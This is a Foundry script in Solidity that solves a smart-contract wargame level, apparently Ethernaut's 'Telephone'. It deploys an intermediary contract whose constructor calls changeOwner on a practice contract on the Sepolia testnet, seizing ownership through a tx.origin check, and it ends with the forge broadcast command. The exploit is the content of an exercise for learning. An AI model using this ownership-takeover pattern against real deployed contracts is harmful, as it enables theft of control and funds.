// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level4Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: Claim ownership of the contract below to complete this level.

contract Player {
    Telephone public telephone;

    constructor(address _telephone, address _newOwner) {
        telephone = Telephone(_telephone);
        telephone.changeOwner(_newOwner);
    }
}

contract Level4Solution is Script {
    Telephone public telephone =
        Telephone(0x49123A1764fE081259041De035E58c463136Da39);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(address(telephone), address(vm.envAddress("MY_ADDRESS")));
        console.log("Owner: ", telephone.owner());

        vm.stopBroadcast();
    }
}
// forge script script/Level4Solution.s.sol:Level4Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
